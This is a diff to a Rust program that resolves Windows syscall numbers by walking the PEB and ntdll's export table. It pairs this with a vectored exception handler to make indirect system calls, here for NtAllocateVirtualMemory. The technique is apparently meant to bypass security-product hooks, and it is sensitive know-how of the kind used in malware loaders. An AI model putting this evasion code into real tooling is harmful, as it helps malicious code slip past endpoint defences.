@@ -119,10 +119,10 @@ fn find_sysaddr(function_name: &str, sys_addr: &mut *mut c_void) {
                             let low = *bytes.offset(i + 4) as u32;
                             let high = *bytes.offset(i + 5) as u32;
 
-                            // ssn = ((high << 8) | low) as i32;
+                            let ssn = ((high << 8) | low) as i32;
                             *sys_addr = func_addr.add(18 as usize) as *mut c_void;
 
-                            // println!("[+] {} has SSN: {}", func_name, ssn);
+                            println!("[+] {} has SSN: 0x{:X}", func_name, ssn);
                             println!("[+] Syscall address: {:?}", *sys_addr);
                             return;
                         }
@@ -134,11 +134,101 @@ fn find_sysaddr(function_name: &str, sys_addr: &mut *mut c_void) {
     // ssn
 }
 
+fn get_ssn(function_name: &str) -> i32 {
+    let mut ssn: i32 = 0;
+    unsafe {
+        let teb = get_current_teb();
+        let peb = (*teb).ProcessEnvironmentBlock;
+
+        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
+            print!("[-] Invalid PEB");
+            return ssn;
+        }
+
+        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
+            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;
+        let ntdll_base = (*ldr_data_entry).DllBase;
+        println!("[+] ntdll.dll base address: {:?}", ntdll_base);
+
+        let dos_header = ntdll_base as *const IMAGE_DOS_HEADER;
+
+        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
+            print!("[-] Invalid DOS header");
+            return ssn;
+        }
+
+        let nt_headers = (ntdll_base as *const u8).add((*dos_header).e_lfanew as usize)
+            as *const IMAGE_NT_HEADERS64;
+
+        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
+            print!("[-] Invalid NT header");
+            return ssn;
+        }
+
+        let export_dir = (ntdll_base as *const u8)
+            .add((*nt_headers).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
+            as *const IMAGE_EXPORT_DIRECTORY;
+
+        let address_of_functions =
+            (ntdll_base as *const u8).add((*export_dir).AddressOfFunctions as usize) as *const u32;
+        let address_of_names =
+            (ntdll_base as *const u8).add((*export_dir).AddressOfNames as usize) as *const u32;
+        let address_of_name_ordinals = (ntdll_base as *const u8)
+            .add((*export_dir).AddressOfNameOrdinals as usize)
+            as *const u16;
+
+        for i in 0..(*export_dir).NumberOfNames as isize {
+            let name =
+                (ntdll_base as *const u8).add(*address_of_names.offset(i) as usize) as *const i8;
+
+            let ordinal = *address_of_name_ordinals.offset(i) as usize;
+
+            if ordinal >= (*export_dir).NumberOfFunctions as usize {
+                continue;
+            }
+
+            let func_rva = *address_of_functions.offset(ordinal as isize);
+            let func_addr = (ntdll_base as *const u8).add(func_rva as usize);
+
+            let c_str = CStr::from_ptr(name);
+
+            if let Ok(func_name) = c_str.to_str() {
+                if function_name.eq_ignore_ascii_case(func_name) {
+                    println!("[+] Found {} at address: {:?}", func_name, func_addr);
+
+                    let bytes = func_addr as *const u8;
+
+                    for i in 0..32 {
+                        if *bytes.offset(i) == 0x4c
+                            && *bytes.offset(i + 1) == 0x8b
+                            && *bytes.offset(i + 2) == 0xd1
+                            && *bytes.offset(i + 3) == 0xb8
+                            && *bytes.offset(i + 6) == 0x00
+                            && *bytes.offset(i + 7) == 0x00
+                        {
+                            let low = *bytes.offset(i + 4) as u32;
+                            let high = *bytes.offset(i + 5) as u32;
+
+                            ssn = ((high << 8) | low) as i32;
+                            let sys_addr = func_addr.add(18 as usize) as *mut c_void;
+
+                            println!("[+] {} has SSN: 0x{:X}", func_name, ssn);
+                            println!("[+] Syscall address: {:?}", sys_addr);
+                            return ssn;
+                        }
+                    }
+                }
+            }
+        }
+    }
+    ssn
+}
+
 unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
     unsafe {
         if (*(*exception_info).ExceptionRecord).ExceptionCode == EXCEPTION_ACCESS_VIOLATION {
             println!(
-                "Access violation at address: {:?}",
+                "[+] VEH Triggered: Access violation at address: {:?}",
                 (*(*exception_info).ExceptionRecord).ExceptionAddress
             );
             (*(*exception_info).ContextRecord).R10 = (*(*exception_info).ContextRecord).Rcx;
@@ -160,7 +250,7 @@ fn main() {
         let mut sys_addr = null_mut();
         find_sysaddr("NtClose", &mut sys_addr);
 
-        let ssn = 0x18;
+        let ssn = get_ssn("NtAllocateVirtualMemory");
 
         SYSCALL_ADDR = sys_addr;
 
